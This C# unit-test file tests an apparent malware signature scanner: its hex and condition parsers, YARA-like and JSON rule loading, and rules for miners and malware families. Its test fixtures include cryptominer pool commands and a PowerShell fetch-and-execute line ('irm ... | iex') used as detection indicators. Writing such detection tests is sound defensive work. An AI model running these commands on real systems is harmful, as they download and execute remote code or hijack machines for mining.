using System.Text;
using Sentinel.Core.Signatures;

namespace Sentinel.Core.Tests;

public class PatternTests
{
    [Fact]
    public void Hex_WithWildcardsAndNibbles_Matches()
    {
        var p = PatternBuilder.FromHex("$a", "4D 5A ?? 0? ?F");
        var data = new byte[] { 0, 0x4D, 0x5A, 0x77, 0x05, 0xAF, 0x4D, 0x5A, 0x00, 0x15, 0x0F };
        Assert.Equal(new long[] { 1 }, PatternMatcher.FindAll(data, p));
    }

    [Fact]
    public void Hex_WithoutSpaces_IsAccepted()
    {
        var p = PatternBuilder.FromHex("$a", "DEADbeef");
        Assert.Equal(new byte[] { 0xDE, 0xAD, 0xBE, 0xEF }, p.Bytes);
        Assert.True(p.IsExact);
    }

    [Theory]
    [InlineData("4D 5")]
    [InlineData("4D [2-4] 5A")]
    [InlineData("( 4D | 5A )")]
    [InlineData("?? ??")]
    [InlineData("ZZ")]
    [InlineData("")]
    public void Hex_Invalid_Throws(string hex) =>
        Assert.Throws<RuleFormatException>(() => PatternBuilder.FromHex("$a", hex));

    [Fact]
    public void Text_NoCaseAndWide_ProduceVariants()
    {
        var variants = PatternBuilder.FromText("$a", "AbC"u8.ToArray(), "AbC", noCase: true, ascii: true, wide: true);
        Assert.Equal(2, variants.Count);

        var data = Encoding.Unicode.GetBytes("xx ABC yy").Concat("..abc.."u8.ToArray()).ToArray();
        Assert.Single(PatternMatcher.FindAll(data, variants[0]));
        Assert.Single(PatternMatcher.FindAll(data, variants[1]));
    }

    [Fact]
    public void Exact_FindAll_ReturnsOverlappingHits_AndRespectsLimit()
    {
        var p = PatternBuilder.FromText("$a", "aa"u8.ToArray(), "aa", false, true, false)[0];
        Assert.Equal(new long[] { 0, 1, 2 }, PatternMatcher.FindAll("aaaa"u8, p));
        Assert.Equal(2, PatternMatcher.FindAll("aaaa"u8, p, maxHits: 2).Count);
    }
}

public class ConditionTests
{
    private static bool Eval(string condition, string data, params (string Id, string Text)[] strings)
    {
        var patterns = strings.SelectMany(s => PatternBuilder.FromText(s.Id, Encoding.UTF8.GetBytes(s.Text), s.Text, false, true, false)).ToList();
        var rule = new SignatureRule
        {
            Id = "T",
            Name = "T",
            Patterns = patterns,
            Condition = ConditionParser.Parse(condition),
            SourceFile = "mem",
        };
        var engine = new SignatureEngine(new RuleSet([rule], []));
        return engine.Scan(Encoding.UTF8.GetBytes(data)).Count == 1;
    }

    [Theory]
    [InlineData("$a and $b or $c", "c", true)]          // and связывает сильнее or
    [InlineData("$a and ($b or $c)", "c", false)]
    [InlineData("not $a", "xyz", true)]
    [InlineData("any of them", "b", true)]
    [InlineData("all of them", "a b", false)]
    [InlineData("all of them", "a b c", true)]
    [InlineData("2 of ($a, $b, $c)", "a c", true)]
    [InlineData("2 of ($a, $b)", "a c", false)]
    [InlineData("$a at 0", "a..", true)]
    [InlineData("$a at 1", "a..", false)]
    [InlineData("$b in (2..4)", "...b", true)]
    [InlineData("$b in (0..2)", "...b", false)]
    [InlineData("#a >= 3", "a a a", true)]
    [InlineData("#a == 2", "a a a", false)]
    [InlineData("filesize < 1KB", "abc", true)]
    [InlineData("filesize > 2", "abc", true)]
    [InlineData("uint16(0) == 0x6261", "abc", true)]
    [InlineData("uint16be(0) == 0x6162", "abc", true)]
    [InlineData("uint32(0) == 0", "ab", false)]
    [InlineData("true and not false", "", true)]
    public void Evaluates(string condition, string data, bool expected) =>
        Assert.Equal(expected, Eval(condition, data, ("$a", "a"), ("$b", "b"), ("$c", "c")));

    [Fact]
    public void Wildcard_Selector_MatchesPrefix()
    {
        Assert.True(Eval("all of ($x*)", "x1 x2", ("$x1", "x1"), ("$x2", "x2"), ("$y", "zz")));
        Assert.False(Eval("all of ($x*)", "x1", ("$x1", "x1"), ("$x2", "x2"), ("$y", "zz")));
    }

    [Theory]
    [InlineData("$a and")]
    [InlineData("(any of them")]
    [InlineData("0 of them")]
    [InlineData("pe.is_pe")]
    [InlineData("filesize 10")]
    [InlineData("$a $b")]
    [InlineData("$a*")]
    public void Invalid_Throws(string condition) =>
        Assert.Throws<RuleFormatException>(() => ConditionParser.Parse(condition));
}

public class YaraLikeParserTests
{
    private const string Sample = """
        /* многострочный
           комментарий */
        rule First : tag1 tag2
        {
            meta:
                id = "SNT-T-1"
                severity = "critical"
                category = "unit"
                description = "проверка"
                version = 3
            strings:
                $s = "Hello\x20\"World\"" nocase
                $h = { 4D 5A ?? 00 }   // hex
                $w = "wide" wide ascii
            condition:
                $s or ($h and $w)
        }

        private rule Second { condition: filesize < 10 }
        """;

    [Fact]
    public void Parses_MetaStringsConditionAndTags()
    {
        var rules = YaraLikeRuleParser.Parse(Sample, "x.yar");
        Assert.Equal(2, rules.Count);

        var r = rules[0];
        Assert.Equal("SNT-T-1", r.Id);
        Assert.Equal("First", r.Name);
        Assert.Equal(Severity.Critical, r.Severity);
        Assert.Equal("unit", r.Category);
        Assert.Equal(new[] { "tag1", "tag2" }, r.Tags);
        Assert.Equal(4, r.Patterns.Count); // $s, $h, $w(ascii), $w(wide)
        Assert.Equal("hello \"world\"", Encoding.UTF8.GetString(r.Patterns[0].Bytes));

        Assert.Equal("Second", rules[1].Id);
    }

    [Fact]
    public void ParsedRule_Matches()
    {
        var engine = new SignatureEngine(new RuleSet(YaraLikeRuleParser.Parse(Sample, "x.yar"), []));
        var hits = engine.Scan("...HELLO \"world\"..."u8.ToArray(), null);
        Assert.Contains(hits, m => m.RuleId == "SNT-T-1" && m.Hits.Single().Offset == 3);
    }

    [Theory]
    [InlineData("rule A { strings: $a = \"x\" }", "condition")]
    [InlineData("rule A { condition: $missing }", "$missing")]
    [InlineData("import \"pe\"\nrule A { condition: true }", "import")]
    [InlineData("rule A { strings: $a = /re/ condition: $a }", "Регулярные")]
    [InlineData("rule A { strings: $a = \"x\" fullword condition: $a }", "fullword")]
    [InlineData("rule A { strings: $a = \"x\" $a = \"y\" condition: $a }", "Повторное")]
    [InlineData("rule A { meta: severity = \"extreme\" condition: true }", "severity")]
    [InlineData("rule 1A { condition: true }", "числовой")]
    [InlineData("rule A-B { condition: true }", "Неожиданный символ")]
    [InlineData("rule A { strings: $a = \"unterminated\n condition: $a }", "Незакрытая")]
    public void Invalid_ReportsMeaningfulError(string text, string fragment)
    {
        var ex = Assert.Throws<RuleFormatException>(() => YaraLikeRuleParser.Parse(text, "bad.yar"));
        Assert.Contains(fragment, ex.Message, StringComparison.Ordinal);
    }

    [Fact]
    public void Error_ContainsLineNumber()
    {
        var ex = Assert.Throws<RuleFormatException>(() =>
            YaraLikeRuleParser.Parse("rule A {\n  strings:\n    $a = \"x\"\n  condition:\n    $a and $zz\n}", "bad.yar"));
        Assert.Equal(1, ex.Line);
        var ex2 = Assert.Throws<RuleFormatException>(() =>
            YaraLikeRuleParser.Parse("rule A {\n  strings:\n    $a = \"x\" bogus\n  condition: $a }", "bad.yar"));
        Assert.Equal(3, ex2.Line);
    }
}

public class JsonRuleParserTests
{
    [Fact]
    public void Parses_RulesArray_WithDefaults()
    {
        const string json = """
            {
              // комментарии допустимы
              "rules": [
                { "name": "J1", "strings": [ { "text": "abc" }, { "id": "$h", "hex": "01 02" } ] },
                { "id": "J-2", "name": "J2", "severity": "low", "sha256": ["BA7816BF8F01CFEA414140DE5DAE2223B00361A396177A9CB410FF61F20015AD"] },
              ]
            }
            """;
        var rules = JsonRuleParser.Parse(json, "r.json");

        Assert.Equal(2, rules.Count);
        Assert.Equal("J1", rules[0].Id);
        Assert.IsType<OfCondition>(rules[0].Condition);
        Assert.Equal(new[] { "$s0", "$h" }, rules[0].Patterns.Select(p => p.Id));
        Assert.Null(rules[1].Condition);
        Assert.Contains("ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad", rules[1].Sha256);
    }

    [Fact]
    public void HashRule_MatchesByHash()
    {
        var rules = JsonRuleParser.Parse("""{ "name": "H", "sha256": ["ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"] }""", "h.json");
        var engine = new SignatureEngine(new RuleSet(rules, []));
        var match = Assert.Single(engine.Scan("abc"u8.ToArray(), "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"));
        Assert.True(match.MatchedByHash);
        Assert.Empty(engine.Scan("abc"u8.ToArray(), "00"));
    }

    [Theory]
    [InlineData("{ \"strings\": [] }", "name")]
    [InlineData("{ \"name\": \"A\" }", "ни условия")]
    [InlineData("{ \"name\": \"A\", \"strings\": [ { \"text\": \"a\", \"hex\": \"61\" } ] }", "ровно одно")]
    [InlineData("{ \"name\": \"A\", \"sha256\": [\"abc\"] }", "SHA-256")]
    [InlineData("{ \"name\": \"A\", \"strings\": [ { \"id\": \"a\", \"text\": \"a\" } ] }", "идентификатор")]
    [InlineData("{ \"name\": \"A\", \"strings\": [ { \"text\": \"a\" } ], \"condition\": \"$x\" }", "$x")]
    [InlineData("{ broken", "JSON")]
    public void Invalid_Throws(string json, string fragment)
    {
        var ex = Assert.Throws<RuleFormatException>(() => JsonRuleParser.Parse(json, "bad.json"));
        Assert.Contains(fragment, ex.Message, StringComparison.Ordinal);
    }
}

public class RuleLoaderTests
{
    [Fact]
    public void LoadDirectory_CollectsErrorsWithoutStopping_AndRejectsDuplicateIds()
    {
        using var tmp = new TempDir();
        tmp.WriteText("a.yar", "rule A { strings: $a = \"x\" condition: $a }");
        tmp.WriteText("sub/b.json", "{ \"name\": \"B\", \"strings\": [ { \"text\": \"y\" } ] }");
        tmp.WriteText("c.yara", "rule Broken { condition: $nope }");
        tmp.WriteText("d.rule", "rule A { condition: true }");
        tmp.WriteText("ignored.txt", "not a rule");

        var set = RuleLoader.LoadDirectory(tmp.Path);

        Assert.Equal(new[] { "A", "B" }, set.Rules.Select(r => r.Id).OrderBy(x => x));
        Assert.Equal(2, set.Errors.Count);
        Assert.Contains(set.Errors, e => e.File.EndsWith("c.yara", StringComparison.Ordinal));
        Assert.Contains(set.Errors, e => e.Message.Contains("Дублирующийся", StringComparison.Ordinal));
    }

    [Fact]
    public void MissingDirectory_IsReportedAsError()
    {
        var set = RuleLoader.LoadDirectory(Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N")));
        Assert.Empty(set.Rules);
        Assert.Single(set.Errors);
    }

    [Fact]
    public void RepositoryRules_LoadWithoutErrors()
    {
        var set = RuleLoader.LoadDirectory(RepoPaths.RulesDirectory);
        Assert.Empty(set.Errors);
        Assert.Contains(set.Rules, r => r.Id == "SNT-TEST-0001");
        Assert.Contains(set.Rules, r => r.Category == "miner");
        Assert.Contains(set.Rules, r => r.Category == "stealer");
    }
}

public class RuleApplicabilityTests
{
    private static readonly byte[] PoolDomainBytes = System.Text.Encoding.ASCII.GetBytes("domain:pool.minexmr.com\n");

    private static IReadOnlyList<SignatureMatch> Scan(string path, bool isPe = false) =>
        new SignatureEngine(RuleLoader.LoadDirectory(RepoPaths.RulesDirectory)).Scan(PoolDomainBytes, PoolDomainBytes.Length, null, new ScanTarget(path, isPe));

    [Theory]
    [InlineData(@"C:\Users\Bob\Downloads\Xray\geosite.dat")]
    [InlineData(@"C:\Users\Bob\AppData\Roaming\Ward\assets\geoip.dat")]
    [InlineData(@"C:\data\GeoSite.DAT")]
    [InlineData(@"C:\data\routing.dat")]
    public void PoolDomainRule_DoesNotFire_OnNonExecutableGeoDatabases(string path) =>
        Assert.DoesNotContain(Scan(path), m => m.Category == "miner");

    [Theory]
    [InlineData(@"C:\miner\xmrig.exe")]
    [InlineData(@"C:\miner\renamed.dat", true)]
    public void PoolDomainRule_StillFires_OnExecutables(string path, bool isPe = false) =>
        Assert.Contains(Scan(path, isPe), m => m.RuleId == "SNT-MINER-0002");

    [Theory]
    [InlineData(@"C:\miner\config.json", "{ \"url\": \"pool.supportxmr.com:443\" }")]
    [InlineData(@"C:\miner\start.bat", "xmrig.exe -o gulf.moneroocean.stream:10128 -u 4abc")]
    [InlineData(@"C:\miner\start.ps1", "& .\\svc.exe --url pool.minexmr.com --user 4abc")]
    [InlineData(@"C:\miner\config.json", "{ \"pools\": [ { \"url\": \"xmr.2miners.com\" } ] }")]
    public void PoolEndpointRule_Fires_OnMinerConfigsAndScripts(string path, string content) =>
        Assert.Contains(ScanText(path, content), m => m.RuleId == "SNT-MINER-0003");

    // Списки блокировки (AdBlock, uBlock, подписки Edge) перечисляют домены пулов именно для того, чтобы их блокировать.
    [Theory]
    [InlineData(@"C:\Users\u\AppData\Local\Google\Chrome\User Data\Default\Extensions\gighmmpiobklfepjocnamgkkbiglidom\6.53.0_0\data\rules\abp\D72B6F06-52B2-4FED-96A2-1BF59CDD7AEC",
        "[Adblock Plus 2.0]\n! Title: NoCoin\n||pool.minexmr.com^\n||xmr.2miners.com^\n||pool.supportxmr.com^$third-party\n")]
    [InlineData(@"C:\Users\u\AppData\Local\Google\Chrome\User Data\Default\Extensions\gighmmpiobklfepjocnamgkkbiglidom\6.53.0_0\background.js",
        "const rules=[{id:1,action:{type:\"block\"},condition:{urlFilter:\"||gulf.moneroocean.stream^\"}}];")]
    [InlineData(@"C:\Users\u\AppData\Local\Microsoft\Edge\User Data\Subresource Filter\Unindexed Rules\10.34.0.84\Part-FR",
        "xmr-eu1.nanopool.org\0pool.minexmr.com\0")]
    [InlineData(@"C:\Users\u\filters\hosts.txt", "0.0.0.0 pool.minexmr.com\n0.0.0.0 xmr.2miners.com\n")]
    public void PoolRules_DoNotFire_OnBlocklists(string path, string content) =>
        Assert.DoesNotContain(ScanText(path, content), m => m.Category == "miner");

    // Отчёт полной проверки 1.3.5/1.3.6 (Katana): индикаторы семейств в истории Chrome, кэше Discord и журналах Claude Code —
    // это упоминания угрозы (пользователь её искал и обсуждал), а не сама угроза.
    [Theory]
    [InlineData(@"C:\Users\avito\AppData\Local\Google\Chrome\User Data\Default\History")]
    [InlineData(@"C:\Users\avito\AppData\Local\Google\Chrome\User Data\Default\Network Action Predictor")]
    [InlineData(@"C:\Users\avito\AppData\Local\Google\Chrome\User Data\Default\Shortcuts")]
    [InlineData(@"C:\Users\avito\AppData\Local\Google\Chrome\User Data\Default\Favicons")]
    [InlineData(@"C:\Users\avito\AppData\Roaming\discord\Cache\Cache_Data\data_3")]
    [InlineData(@"C:\Users\avito\.claude\projects\C--Users-avito--local-bin\450208d7-ca7f-4db7-92ff-3d690a6040e7.jsonl")]
    [InlineData(@"C:\Users\avito\.claude\file-history\450208d7-ca7f-4db7-92ff-3d690a6040e7\9ef7507ea50a80d2@v2")]
    [InlineData(@"C:\Users\avito\AppData\Roaming\Mozilla\Firefox\Profiles\x.default\places.sqlite")]
    [InlineData(@"C:\Users\avito\Documents\notes\THREAT_FAMILIES.md")]
    public void FamilyIndicators_InHistoryCachesAndTranscripts_AreMentionsNotThreats(string path) =>
        Assert.DoesNotContain(ScanText(path, FamilyMentions), m => m.Category is "miner" or "loader");

    [Theory]
    [InlineData(@"C:\ProgramData\CAAService\config.json")]
    [InlineData(@"C:\Users\avito\AppData\Roaming\svc\start.bat")]
    [InlineData(@"C:\Users\avito\AppData\Local\Google\Chrome\User Data\Default\cneicjnb.gkn")]
    [InlineData(@"C:\Windows\System32\Tasks\Office-Persistent-Activation")]
    public void FamilyIndicators_InConfigsScriptsAndUnknownFiles_StillFire(string path)
    {
        var matches = ScanText(path, FamilyMentions);
        Assert.Contains(matches, m => m.RuleId == "SNT-FAM-CAA-0002");
        Assert.Contains(matches, m => m.RuleId == "SNT-FAM-TECHIAS-0002");
    }

    [Theory]
    [InlineData("cneicjnb.gkn", true)]
    [InlineData("kyerdwei.xtk", true)]
    [InlineData("readme12.txt", true)]
    [InlineData("Settings.dat", false)]
    [InlineData("cneicjnbx.gkn", false)]
    [InlineData("CNEICJNB.GKN", false)]
    public void RandomDropNames(string name, bool expected) => Assert.Equal(expected, ScanTarget.IsRandomDropName(name));

    [Fact]
    public void ExecutableInBrowserCache_IsStillScanned()
    {
        var bytes = System.Text.Encoding.UTF8.GetBytes(FamilyMentions);
        var matches = new SignatureEngine(RuleLoader.LoadDirectory(RepoPaths.RulesDirectory))
            .Scan(bytes, bytes.Length, null, new ScanTarget(@"C:\Users\u\AppData\Roaming\discord\Cache\Cache_Data\f_000123", true));
        Assert.Contains(matches, m => m.RuleId == "SNT-FAM-CAA-0002");
    }

    private const string FamilyMentions =
        "pearlhash --algorithm-gpu kryptex.network irm https://activate.techias.co.uk | iex";

    private static IReadOnlyList<SignatureMatch> ScanText(string path, string content)
    {
        var bytes = System.Text.Encoding.UTF8.GetBytes(content);
        return new SignatureEngine(RuleLoader.LoadDirectory(RepoPaths.RulesDirectory)).Scan(bytes, bytes.Length, null, new ScanTarget(path, false));
    }

    [Fact]
    public void RuleWithoutRestrictions_AppliesEverywhere() =>
        Assert.Contains(new SignatureEngine(RuleLoader.LoadDirectory(RepoPaths.RulesDirectory))
            .Scan(System.Text.Encoding.ASCII.GetBytes("stratum+tcp:// randomx"), 22, null, new ScanTarget(@"C:\x\blob.dat", false)),
            m => m.RuleId == "SNT-MINER-0001");
}
